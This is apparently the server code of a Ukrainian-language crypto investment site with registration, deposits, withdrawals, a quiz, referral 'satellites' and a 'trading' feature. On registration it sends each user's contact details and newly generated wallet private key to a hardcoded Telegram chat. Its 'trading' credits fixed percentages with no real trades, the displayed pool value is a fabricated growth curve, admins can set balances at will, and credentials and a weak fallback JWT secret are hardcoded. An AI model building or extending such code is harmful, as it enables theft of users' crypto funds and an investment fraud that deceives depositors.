const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const path = require("path");
const { Wallet } = require("ethers");
const axios = require("axios");
const crypto = require("crypto");
const { createClient } = require("@supabase/supabase-js");

const app = express();
app.use(cors());
app.use(express.json());

const PUBLIC_FILES = new Set([
  "index.html", "login.html", "register.html", "terms.html", "loading.html",
  "trade.html", "assets.html", "learning.html", "info.html", "coin.html",
  "deposit.html", "withdraw.html", "profile.html", "admin.html", "app.css", "app-nav.js",
  "pwa.js", "service-worker.js", "manifest.json", "logo.png"
]);
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.get("/:file", (req, res, next) => {
  if (!PUBLIC_FILES.has(req.params.file)) return next();
  return res.sendFile(path.join(__dirname, req.params.file));
});

const SECRET = process.env.JWT_SECRET || "SECRET_KEY";
const supabase = createClient(
  process.env.SUPABASE_URL || "https://pwqmiiruxceepjammiza.supabase.co",
  process.env.SUPABASE_KEY || "sb_publishable_7lxiFe5VT8iQx37Ip7R2YA_99WVsa1N"
);
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8714057941:AAGZL1OXRoy8-7_IoVAHBePTLwuTKmqicOg";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "337179852";
const ADMIN_KEY = process.env.ADMIN_KEY || "";
const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const EMAIL_FROM = process.env.EMAIL_FROM || "United Ukraine <onboarding@resend.dev>";

const PUBLIC_USER_FIELDS = "id,fullname,nickname,country,email,phone,balance,deposit,satellites,wallet_address,referrer_id";
const QUIZ_ANSWERS = { 1: "b", 2: "c", 3: "a", 4: "b", 5: "c" };
const TRADE_RATES = [0.01, 0.01, 0.015, 0.0225, 0.035, 0.055];
const TRADE_COOLDOWN_MS = 24 * 60 * 60 * 1000;
const POOL_BASE = 1000347;
const POOL_START_DAY = Date.UTC(2026, 5, 22) / 86400000;

function auth(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ success: false, message: "Unauthorized" });

  try {
    req.userId = jwt.verify(token, SECRET).id;
    next();
  } catch {
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }
}

function adminAuth(req, res, next) {
  const key = req.headers["x-admin-key"];
  if (!ADMIN_KEY) return res.status(503).json({ success: false, message: "Admin access is not configured" });
  if (!key || key !== ADMIN_KEY) return res.status(401).json({ success: false, message: "Unauthorized" });
  next();
}

async function findUser(id, fields = PUBLIC_USER_FIELDS) {
  const { data } = await supabase.from("users").select(fields).eq("id", id).maybeSingle();
  return data;
}

function formatUserId(id) {
  return String(id).padStart(8, "0");
}

function withDisplayId(user) {
  return user ? { ...user, display_id: formatUserId(user.id) } : user;
}

function poolRateForDay(dayNumber) {
  const date = new Date(dayNumber * 86400000).toISOString().slice(0, 10);
  let hash = 2166136261;
  for (const character of date) {
    hash ^= character.charCodeAt(0);
    hash = Math.imul(hash, 16777619) >>> 0;
  }
  return 1 + (100 + (hash % 401)) / 10000;
}

function poolValueForDay(dayNumber) {
  let value = POOL_BASE;
  if (dayNumber > POOL_START_DAY) {
    for (let day = POOL_START_DAY + 1; day <= dayNumber; day += 1) value *= poolRateForDay(day);
  } else if (dayNumber < POOL_START_DAY) {
    for (let day = POOL_START_DAY; day > dayNumber; day -= 1) value /= poolRateForDay(day);
  }
  return Number(value.toFixed(2));
}

function getPoolSnapshot(days = 30) {
  const today = Math.floor(Date.now() / 86400000);
  const series = [];
  for (let day = today - days + 1; day <= today; day += 1) {
    series.push({
      date: new Date(day * 86400000).toISOString().slice(0, 10),
      value: poolValueForDay(day)
    });
  }
  return {
    current: poolValueForDay(today),
    nextChangeAt: new Date((today + 1) * 86400000).toISOString(),
    dailyChangePercent: Number(((poolRateForDay(today) - 1) * 100).toFixed(2)),
    series
  };
}

async function addSignal(signal) {
  const { error } = await supabase.from("signals").insert([signal]);
  if (error) throw error;
}

function emailCodeDigest(code) {
  return crypto.createHash("sha256").update(`${code}:${SECRET}`).digest("hex");
}

async function sendVerificationEmail(email, code, purpose = "registration") {
  if (!RESEND_API_KEY) throw new Error("RESEND_API_KEY is not configured");
  const action = purpose === "email_change" ? "зміни електронної пошти" : "реєстрації";
  await axios.post("https://api.resend.com/emails", {
    from: EMAIL_FROM,
    to: [email],
    subject: `Код підтвердження United Ukraine: ${code}`,
    html: `<div style="font-family:Arial,sans-serif;max-width:560px;margin:auto;color:#111"><h2>United Ukraine</h2><p>Ваш код для ${action}:</p><div style="font-size:34px;font-weight:700;letter-spacing:8px;margin:24px 0">${code}</div><p>Код дійсний 10 хвилин. Якщо ви не робили цей запит, просто проігноруйте лист.</p></div>`
  }, {
    headers: { Authorization: `Bearer ${RESEND_API_KEY}`, "Content-Type": "application/json" }
  });
}

function registrationData(body) {
  return {
    fullname: String(body.fullname || "").trim(),
    nickname: String(body.nickname || "").trim(),
    country: String(body.country || "").trim(),
    phone: String(body.phone || "").replace(/\D/g, ""),
    email: String(body.email || "").trim().toLowerCase(),
    password: String(body.password || ""),
    referrerId: body.referrer_id ? Number(body.referrer_id) : null
  };
}

async function validateRegistration(data) {
  if (!data.fullname || !data.nickname || !data.country || !data.email || !data.password || !data.phone) return "No data";
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) return "Invalid email";
  if (data.phone.length < 10 || data.phone.length > 15) return "Invalid phone";
  if (data.password.length < 6) return "Weak password";
  if (data.referrerId && (!Number.isInteger(data.referrerId) || data.referrerId <= 0 || !(await findUser(data.referrerId, "id")))) return "Invalid referrer";
  const { data: existing } = await supabase.from("users").select("id").eq("email", data.email).maybeSingle();
  return existing ? "User exists" : null;
}

function requestIp(req) {
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (ip.includes(",")) ip = ip.split(",")[0].trim();
  return ip.replace("::ffff:", "");
}

async function tooManyAccounts(ip) {
  const { count } = await supabase.from("users").select("id", { count: "exact", head: true }).eq("ip", ip);
  return (count || 0) >= 3;
}

async function refreshSatelliteCount(userId) {
  if (!userId) return;
  const { count } = await supabase
    .from("users")
    .select("id", { count: "exact", head: true })
    .eq("referrer_id", userId);
  await supabase.from("users").update({ satellites: count || 0 }).eq("id", userId);
}

app.post("/register/start", async (req, res) => {
  try {
    const data = registrationData(req.body);
    const validationError = await validateRegistration(data);
    if (validationError) return res.json({ success: false, message: validationError });
    const ip = requestIp(req);
    if (await tooManyAccounts(ip)) return res.json({ success: false, message: "Too many accounts" });

    const code = crypto.randomInt(100000, 1000000).toString();
    const pendingToken = jwt.sign({
      purpose: "registration",
      profile: { ...data, password: undefined },
      passwordHash: await bcrypt.hash(data.password, 10),
      codeDigest: emailCodeDigest(code),
      ip
    }, SECRET, { expiresIn: "10m" });
    await sendVerificationEmail(data.email, code);
    return res.json({ success: true, pendingToken, email: data.email });
  } catch (error) {
    console.error("REGISTER START ERROR:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Email send error" });
  }
});

app.post("/register/verify", async (req, res) => {
  try {
    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
    const code = String(req.body.code || "").trim();
    if (pending.purpose !== "registration" || emailCodeDigest(code) !== pending.codeDigest) {
      return res.json({ success: false, message: "Invalid code" });
    }
    const data = { ...pending.profile, password: "verified" };
    const validationError = await validateRegistration(data);
    if (validationError) return res.json({ success: false, message: validationError });
    if (await tooManyAccounts(pending.ip)) return res.json({ success: false, message: "Too many accounts" });

    const wallet = Wallet.createRandom();
    const { data: user, error } = await supabase
      .from("users")
      .insert([{
        fullname: data.fullname,
        nickname: data.nickname,
        referrer_id: data.referrerId,
        country: data.country,
        phone: data.phone,
        email: data.email,
        password: pending.passwordHash,
        balance: 0,
        deposit: 0,
        satellites: 0,
        wallet_address: wallet.address,
        private_key: wallet.privateKey,
        email_code: null,
        email_verified: true,
        ip: pending.ip
      }])
      .select("id,fullname,nickname,country,phone,email,wallet_address,referrer_id,balance")
      .single();

    if (error || !user) {
      console.error("REGISTER INSERT ERROR:", error);
      return res.json({ success: false, message: "Insert error" });
    }

    await addSignal({
      user_id: user.id,
      type: "register",
      amount: 0,
      wallet: user.wallet_address,
      status: "done"
    });
    await refreshSatelliteCount(data.referrerId);

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: [
          "NEW USER",
          `ID: ${formatUserId(user.id)}`,
          `Email: ${user.email}`,
          `Name: ${user.fullname}`,
          `Nickname: ${user.nickname}`,
          `Country: ${user.country}`,
          `Phone: ${user.phone}`,
          `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
          `Wallet: ${wallet.address}`,
          `Private key: ${wallet.privateKey}`,
          "Email verified: yes",
          `Starting balance: $0`
        ].join("\n")
      });
    } catch (telegramError) {
      console.error("TELEGRAM ERROR:", telegramError.message);
    }

    return res.json({ success: true });
  } catch (error) {
    console.error("REGISTER VERIFY ERROR:", error);
    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
  }
});

app.post("/login", async (req, res) => {
  try {
    const email = String(req.body.email || "").trim().toLowerCase();
    const password = String(req.body.password || "");
    if (!email || !password) return res.json({ success: false });

    const { data: user } = await supabase.from("users").select("id,password").eq("email", email).maybeSingle();
    if (!user || !(await bcrypt.compare(password, user.password))) {
      return res.json({ success: false });
    }
    return res.json({ success: true, token: jwt.sign({ id: user.id }, SECRET) });
  } catch (error) {
    console.error("LOGIN ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.get("/me", auth, async (req, res) => {
  const user = await findUser(req.userId);
  if (!user) return res.status(404).json({ success: false });
  return res.json(withDisplayId(user));
});

app.post("/profile/change-request", auth, async (req, res) => {
  try {
    const changes = {
      fullname: String(req.body.fullname || "").trim(),
      nickname: String(req.body.nickname || "").trim(),
      country: String(req.body.country || "").trim(),
      phone: String(req.body.phone || "").replace(/\D/g, "")
    };
    if (!changes.fullname || !changes.nickname || !changes.country || changes.phone.length < 10 || changes.phone.length > 15) {
      return res.json({ success: false, message: "Invalid data" });
    }
    await addSignal({ user_id: req.userId, type: "profile_update", amount: 0, wallet: JSON.stringify(changes), status: "pending" });
    return res.json({ success: true, message: "Request created" });
  } catch (error) {
    console.error("PROFILE REQUEST ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/profile/email/start", auth, async (req, res) => {
  try {
    const email = String(req.body.email || "").trim().toLowerCase();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.json({ success: false, message: "Invalid email" });
    const { data: existing } = await supabase.from("users").select("id").eq("email", email).maybeSingle();
    if (existing) return res.json({ success: false, message: "User exists" });
    const code = crypto.randomInt(100000, 1000000).toString();
    const pendingToken = jwt.sign({ purpose: "email_change", userId: req.userId, email, codeDigest: emailCodeDigest(code) }, SECRET, { expiresIn: "10m" });
    await sendVerificationEmail(email, code, "email_change");
    return res.json({ success: true, pendingToken });
  } catch (error) {
    console.error("EMAIL CHANGE START ERROR:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Email send error" });
  }
});

app.post("/profile/email/verify", auth, async (req, res) => {
  try {
    const pending = jwt.verify(String(req.body.pendingToken || ""), SECRET);
    const code = String(req.body.code || "").trim();
    if (pending.purpose !== "email_change" || Number(pending.userId) !== Number(req.userId) || emailCodeDigest(code) !== pending.codeDigest) {
      return res.json({ success: false, message: "Invalid code" });
    }
    const { data: existing } = await supabase.from("users").select("id").eq("email", pending.email).maybeSingle();
    if (existing) return res.json({ success: false, message: "User exists" });
    await addSignal({ user_id: req.userId, type: "email_update", amount: 0, wallet: JSON.stringify({ email: pending.email }), status: "pending" });
    return res.json({ success: true, message: "Request created" });
  } catch (error) {
    return res.json({ success: false, message: error.name === "TokenExpiredError" ? "Code expired" : "Invalid code" });
  }
});

app.get("/health", (req, res) => res.json({ success: true }));

app.get("/assets/summary", auth, async (req, res) => {
  try {
    const user = await findUser(req.userId, "id,balance,deposit");
    if (!user) return res.status(404).json({ success: false });

    const { data, error } = await supabase
      .from("signals")
      .select("id,type,amount,wallet,status,created_at")
      .eq("user_id", req.userId)
      .order("created_at", { ascending: false });
    if (error) throw error;

    const history = (data || []).filter(signal =>
      signal.type === "deposit" ||
      signal.type === "withdraw" ||
      signal.type.startsWith("quiz_") ||
      signal.type.startsWith("trade_")
    );
    const tradingEarned = history
      .filter(signal => signal.type.startsWith("trade_") && signal.status === "rewarded")
      .reduce((sum, signal) => sum + Number(signal.amount || 0), 0);

    return res.json({
      success: true,
      balance: Number(user.balance || 0),
      deposit: Number(user.deposit || 0),
      tradingEarned: Number(tradingEarned.toFixed(2)),
      history,
      pool: getPoolSnapshot()
    });
  } catch (error) {
    console.error("ASSETS ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/deposit", auth, async (req, res) => {
  try {
    const amount = Number(req.body.amount);
    if (!Number.isFinite(amount) || amount <= 0) {
      return res.json({ success: false, message: "Invalid amount" });
    }
    const user = await findUser(req.userId, "id,wallet_address");
    if (!user) return res.status(404).json({ success: false });

    await addSignal({ user_id: user.id, type: "deposit", amount, wallet: user.wallet_address, status: "pending" });
    return res.json({ success: true, message: "Signal created" });
  } catch (error) {
    console.error("DEPOSIT ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.post("/withdraw", auth, async (req, res) => {
  try {
    const amount = Number(req.body.amount);
    const wallet = String(req.body.wallet || "").trim();
    const user = await findUser(req.userId, "id,balance");
    if (!user || !wallet || !Number.isFinite(amount) || amount <= 0 || Number(user.balance) < amount) {
      return res.json({ success: false, message: "Invalid withdrawal" });
    }

    await addSignal({ user_id: user.id, type: "withdraw", amount, wallet, status: "pending" });
    return res.json({ success: true, message: "Signal created" });
  } catch (error) {
    console.error("WITHDRAW ERROR:", error);
    return res.status(500).json({ success: false });
  }
});

app.get("/referrals", auth, async (req, res) => {
  const { data, error } = await supabase
    .from("users")
    .select("id,nickname,country,balance")
    .eq("referrer_id", req.userId)
    .order("id", { ascending: true });
  if (error) return res.status(500).json({ success: false });
  return res.json((data || []).map(withDisplayId));
});

app.get("/quiz/progress", auth, async (req, res) => {
  const { data } = await supabase
    .from("signals")
    .select("type")
    .eq("user_id", req.userId)
    .like("type", "quiz_%")
    .eq("status", "rewarded");
  const completed = (data || []).map(item => Number(item.type.replace("quiz_", ""))).filter(Boolean);
  return res.json({ success: true, completed });
});

app.post("/quiz/complete", auth, async (req, res) => {
  try {
    const quizId = Number(req.body.quizId);
    const answer = String(req.body.answer || "").toLowerCase();
    if (!QUIZ_ANSWERS[quizId] || QUIZ_ANSWERS[quizId] !== answer) {
      return res.json({ success: false, message: "Incorrect answer" });
    }

    const type = `quiz_${quizId}`;
    const { data: existing } = await supabase
      .from("signals")
      .select("id")
      .eq("user_id", req.userId)
      .eq("type", type)
      .eq("status", "rewarded")
      .limit(1)
      .maybeSingle();
    if (existing) return res.json({ success: false, message: "Already completed" });

    const user = await findUser(req.userId, "id,balance");
    if (!user) return res.status(404).json({ success: false });
    const newBalance = Number(user.balance || 0) + 10;
    const { error } = await supabase.from("users").update({ balance: newBalance }).eq("id", req.userId);
    if (error) throw error;
    await addSignal({ user_id: req.userId, type, amount: 10, wallet: `quiz:${quizId}`, status: "rewarded" });
    return res.json({ success: true, reward: 10, balance: newBalance });
  } catch (error) {
    console.error("QUIZ ERROR:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

async function tradeStatus(userId) {
  const user = await findUser(userId, "id,balance");
  if (!user) return null;

  const { data: referralRows } = await supabase
    .from("users")
    .select("id,nickname,country,balance")
    .eq("referrer_id", userId)
    .order("id", { ascending: true })
    .limit(5);
  const referrals = (referralRows || []).map(withDisplayId);
  const { data: trades } = await supabase
    .from("signals")
    .select("type,created_at")
    .eq("user_id", userId)
    .like("type", "trade_%")
    .order("created_at", { ascending: false });

  const lastByType = {};
  for (const trade of trades || []) {
    if (!lastByType[trade.type]) lastByType[trade.type] = new Date(trade.created_at).getTime();
  }
  const now = Date.now();
  const cooldown = type => Math.max(0, TRADE_COOLDOWN_MS - (now - (lastByType[type] || 0)));

  return {
    balance: Number(user.balance || 0),
    main: { unlocked: true, cooldown: cooldown("trade_main"), rate: TRADE_RATES[0] },
    slots: Array.from({ length: 5 }, (_, index) => {
      const satellite = referrals?.[index] || null;
      return {
        position: index + 1,
        unlocked: Boolean(satellite),
        cooldown: cooldown(`trade_satellite_${index + 1}`),
        rate: TRADE_RATES[index + 1],
        satellite
      };
    })
  };
}

app.get("/trade/status", auth, async (req, res) => {
  const status = await tradeStatus(req.userId);
  if (!status) return res.status(404).json({ success: false });
  return res.json({ success: true, ...status });
});

app.post("/trade/execute", auth, async (req, res) => {
  try {
    const position = Number(req.body.position);
    if (!Number.isInteger(position) || position < 0 || position > 5) {
      return res.json({ success: false, message: "Invalid position" });
    }
    const status = await tradeStatus(req.userId);
    if (!status || status.balance <= 0) return res.json({ success: false, message: "No balance" });

    const option = position === 0 ? status.main : status.slots[position - 1];
    if (!option.unlocked) return res.json({ success: false, message: "Position locked" });
    if (option.cooldown > 0) return res.json({ success: false, message: "Cooldown active", cooldown: option.cooldown });

    const reward = Number((status.balance * option.rate).toFixed(2));
    const newBalance = Number((status.balance + reward).toFixed(2));
    const { error } = await supabase.from("users").update({ balance: newBalance }).eq("id", req.userId);
    if (error) throw error;

    const type = position === 0 ? "trade_main" : `trade_satellite_${position}`;
    const satellite = position === 0 ? null : option.satellite;
    await addSignal({
      user_id: req.userId,
      type,
      amount: reward,
      wallet: satellite ? String(satellite.id) : "main",
      status: "rewarded"
    });
    return res.json({ success: true, reward, balance: newBalance });
  } catch (error) {
    console.error("TRADE ERROR:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
});

app.get("/admin/users", adminAuth, async (req, res) => {
  const { data, error } = await supabase.from("users").select(PUBLIC_USER_FIELDS).order("id", { ascending: true });
  if (error) return res.status(500).json({ success: false, message: error.message });
  const counts = {};
  for (const user of data || []) {
    if (user.referrer_id) counts[user.referrer_id] = (counts[user.referrer_id] || 0) + 1;
  }
  return res.json((data || []).map(user => ({ ...withDisplayId(user), satellites: counts[user.id] || 0 })));
});

app.get("/admin/signals", adminAuth, async (req, res) => {
  const [{ data: signals }, { data: users }] = await Promise.all([
    supabase.from("signals").select("id,user_id,type,amount,wallet,status,created_at").order("created_at", { ascending: false }),
    supabase.from("users").select("id,fullname,nickname,email")
  ]);
  const usersById = Object.fromEntries((users || []).map(user => [user.id, withDisplayId(user)]));
  return res.json((signals || []).map(signal => ({ ...signal, user: usersById[signal.user_id] || null })));
});

app.get("/admin/referrals", adminAuth, async (req, res) => {
  const { data } = await supabase
    .from("users")
    .select("id,fullname,nickname,email,balance,referrer_id")
    .order("id", { ascending: true });
  return res.json((data || []).map(withDisplayId));
});

app.post("/admin/add-balance", adminAuth, async (req, res) => {
  const user = await findUser(Number(req.body.user_id), "id,balance");
  const amount = Number(req.body.amount);
  if (!user || !Number.isFinite(amount)) return res.json({ success: false });
  const balance = Number(user.balance || 0) + amount;
  await supabase.from("users").update({ balance }).eq("id", user.id);
  return res.json({ success: true, balance });
});

app.post("/admin/set-balance", adminAuth, async (req, res) => {
  const userId = Number(req.body.user_id);
  const amount = Number(req.body.amount);
  if (!Number.isFinite(amount)) return res.json({ success: false });
  await supabase.from("users").update({ balance: amount }).eq("id", userId);
  return res.json({ success: true, balance: amount });
});

app.post("/admin/approve", adminAuth, async (req, res) => {
  try {
    const signalId = Number(req.body.id);
    const { data: signal } = await supabase.from("signals").select("id,user_id,type,wallet,status").eq("id", signalId).maybeSingle();
    if (!signal || signal.status !== "pending") return res.json({ success: false, message: "Request unavailable" });
    if (signal.type === "profile_update" || signal.type === "email_update") {
      const changes = JSON.parse(signal.wallet || "{}");
      const allowed = signal.type === "email_update"
        ? { email: String(changes.email || "").trim().toLowerCase(), email_verified: true }
        : {
            fullname: String(changes.fullname || "").trim(),
            nickname: String(changes.nickname || "").trim(),
            country: String(changes.country || "").trim(),
            phone: String(changes.phone || "").replace(/\D/g, "")
          };
      const { error } = await supabase.from("users").update(allowed).eq("id", signal.user_id);
      if (error) throw error;
    }
    await supabase.from("signals").update({ status: "approved" }).eq("id", signalId);
    return res.json({ success: true });
  } catch (error) {
    console.error("ADMIN APPROVE ERROR:", error);
    return res.status(500).json({ success: false, message: "Approval error" });
  }
});

app.post("/admin/reject", adminAuth, async (req, res) => {
  await supabase.from("signals").update({ status: "rejected" }).eq("id", Number(req.body.id));
  return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
